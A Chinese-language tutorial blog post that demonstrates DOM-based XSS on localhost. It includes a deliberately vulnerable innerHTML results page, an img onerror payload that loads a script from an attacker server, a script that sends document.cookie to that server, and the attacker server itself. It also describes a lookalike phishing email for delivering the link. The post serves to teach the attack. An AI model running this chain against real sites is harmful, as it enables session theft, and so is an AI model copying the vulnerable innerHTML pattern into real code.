---
tags: ['网络安全', '面试问题 - 网络']
date: 10.24.2019
image: /images/xss-beat-intro.png
description: 带你完整地演示一遍 DOM 型 XSS 攻击
---

# XSS 攻击 - DOM 型

> Posted: 10.24.2019

<Tag />

## DOM 型 XSS 的特点

DOM 型 XSS 攻击不同于反射型 XSS 和存储型 XSS。

DOM 型 XSS 代码不需要服务器端的解析响应的直接参与，而是通过浏览器端的 DOM 解析。

这完全是客户端的事情。

它的流程是这样的：

1. 攻击者寻找具有漏洞的网站
2. 攻击者给用户发了一个带有恶意字符串的链接
3. 用户点击了该链接
4. 服务器返回 HTML 文档，但是该文档此时不包含那个恶意字符串
5. 客户端执行了该 HTML 文档里的脚本，然后把恶意脚本植入了页面
6. 客服端执行了植入的恶意脚本，XSS攻击就发生了

![dom-xss](/images/dom-xss.png)

## DOM 型 vs. 反射型

如果你看到这里，你会发现，DOM 型 XSS 和反射型 XSS 好像没啥不一样的地方啊？

确实，这俩长得非常像，但它们确是不一样的两种 XSS 攻击。

而两者最关键的区别，就在于：

1. 反射型 XSS 攻击中，服务器在返回 HTML 文档的时候，就已经包含了恶意的脚本
2. DOM 型 XSS 攻击中，服务器在返回 HTML 文档的时候，是不包含恶意脚本的；恶意脚本是在其执行了非恶意脚本后，被注入到文档里的

也就是说，反射型 XSS 发生在页面加载时。

DOM 型 XSS 发生在页面加载完成后的一段时间内。

如果看到这里你还是不太清楚的话，把下面的例子看完，你就懂了。

## 代码模拟

### 被攻击的服务器

首先我们起一个普通的 node 服务器，作为被攻击的网站服务器。

这个服务器就是相当于做了一个简单的搜索，然后返回搜索的结果。

```javascript
const express = require("express");
const path = require('path');

const app = express();

app.use(express.static("./xss.html"));
app.use(express.static("./xss-result.html"));

app.get("/index", (req, res) => {
  res.sendFile(path.join(__dirname, './xss.html'));
});

/**
 * 注意了，我们这里没有直接返回一个包含了恶意脚本的文档
 * 我们返回的，是一个普通的 HTML 文档
 * 我们而是在这个 xss-result.html 里，发送 AJAX 请求，去请求搜索的结果
 * 因此，恶意的脚本代码是在 AJAX 完成后被注入到 DOM 的
 * 因此，这不是反射型 XSS，而是 DOM 型 XSS
 */
app.get("/result", (req, res) => {
  res.sendFile(path.join(__dirname, './xss-result.html'));
});

app.get("/search", (req, res) => {
  // 做一个简单的搜索
  const obj = {
    a: 'this is a',
    b: 'this is b'
  }
  const { q } = req.query;
  if (obj[q]) res.status(200).end(`found: ${obj[q]}`);
  else res.status(200).end(`${q} not found`);
});

app.listen(8081, () => console.log("SB server running on port 8081"));
```

### 被攻击的客户端

前端就是用来展示搜索的结果

输入搜索内容的页面

```html
<body>
  <div class="container">
    <form id="myform">
      搜索： <input type="text" placeholder="搜索..." />
      <button class="submit-btn">提交</button>
    </form>
  </div>
  <script>
    // 绑定表单的提交
    document.querySelector(".submit-btn").addEventListener('click', (e) => {
      e.preventDefault();
      var value = document.querySelector('input').value;
      window.location.href = `http://localhost:8081/result?q=${value}`;
    });
  </script>
</body>
```

搜索后跳转到结果页面：

```html
<body>
  结果：
  <div class="result"></div>
  <script>
    var urlParams = new URLSearchParams(window.location.search);
    var value = urlParams.get('q');
    // 原生 AJAX 方法
    var xhr = new XMLHttpRequest();
    xhr.open('get', `http://localhost:8081/search?q=${value}`, true);
    xhr.send();
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4 && xhr.status === 200) {
        /**
         * 注意，这里是 innerHTML，而不是 innerText
         * 后者会讲 responseText 作为字符串渲染
         * 因此不会触发 XSS 攻击
         */
        document.querySelector('.result').innerHTML = xhr.responseText;
      }
    }
  </script>
</body>
```

最终实现的效果是这样的：

![xss-vic](/images/xss-victim.gif)

### 攻击者寻找目标

攻击者这个时候会搜索 `<img onerror="alert('XSS')" src=null />`

有两点可以帮攻击者定位到你这个不安全的服务器。

1. query string 里出现攻击的代码

![xss error1](/images/xss-error1.png)

2. 在结果页面，攻击代码被执行

![xss attack](/images/xss-attack.gif)

这个时候攻击还没开始，因为这一切都只是发生在攻击者的电脑上而已。

但攻击者已经找到了一个可以利用的网站。接下来就是开始攻击了。

### 开始攻击

一般来说，反射型 XSS 的代码会通过邮件，以链接的方式发送。

如下：

![xss email](/images/xss-email.png)

我们可以发现，这封邮件其实就是钓鱼邮件，但和真的邮件非常像。

只不过其发送者不是 `bilibili`，而是 `bilibiili`。

而他们提供的链接，究竟去到哪里呢？

![xss link](/images/xss-link.png)

我们可以看见，这里真实的 url 为刚才那个防御薄弱的网站。

如果取消 escape，我们可以看见链接是这样的：

`http://localhost:8081/result?q=<img src=null onerror="var script = document.createElement('script');       script.src = 'http:\/\/localhost:8082/danger';body.appendChild(script);" />`

也就是说，当你进入这个页面的时候，就执行了位于 `localhost:8082/danger` 的脚本。

那么问题来了，为什么要走 img，而不是直接调用 script 标签？

因为使用 innerHTML 的时候，无法动态添加 script 标签并执行。

因此，我们的客户端对 XSS 攻击稍微有一点抗性的嘛...

### 攻击者的攻击脚本

一般来说，就是获取 cookie 并且发送到后台。

但其实能做的事情多了。这里就不一一列举了。

```javascript
// 原生 AJAX 方法
var xhr = new XMLHttpRequest();
xhr.open('get', `http://localhost:8082/attack?q=${document.cookie}`, true);
xhr.send();
xhr.onreadystatechange = function () {
  if (xhr.readyState === 4 && xhr.status === 200) {
    /**
     * 傻逼才会在这里显示攻击成功
     * 我这仅仅出于说明的目的
     */
    console.log('攻击成功！');
  }
}
```

### 攻击者的服务器

然后我们起一个攻击者的服务器，用来处理用户发送的数据。

攻击者的服务器很简单，就是接收请求，然后读取 query string 里面的 cookie 信息。

```javascript
const express = require("express");
const path = require('path');
const app = express();

app.use(express.static("./attack.js"));

app.get("/danger", (req, res) => {
  res.sendFile(path.join(__dirname, './attack.js'));
});

app.get("/attack", (req, res) => {
  // 从 query string 上拿到被攻击者的 cookie
  const { q } = req.query;
  console.log(q);
  res.status(204).end();
});

app.listen(8082, () => console.log("Attacker running on port 8082"));
```

### 结果

当用户点击我们的沙雕邮件时，我们成功获取到了用户的 cookie。

![xss-cookie](/images/xss-cookie.png)

客户端报错了，但这已经不重要了。

（出于伪装目的，可以使用 CORS 来避免报错）

![xss-error](/images/xss-finalerror.png)

## DOM 型 XSS 的请求数

在 DOM 型 XSS 执行的过程中，一共发送了两个请求。

![dom-xss-network](/images/dom-xss-network.png)

一个请求是合法的 HTML 文档。

另一个请求便是 XSS 攻击的源头。

再回头去看反射型 XSS 的请求数，你就会很轻松地发现两者的差异了。

## 参考资料

[前端安全之XSS攻击](https://www.cnblogs.com/unclekeith/p/7750681.html)

[Excess XSS](https://excess-xss.com/)

<Chirpy />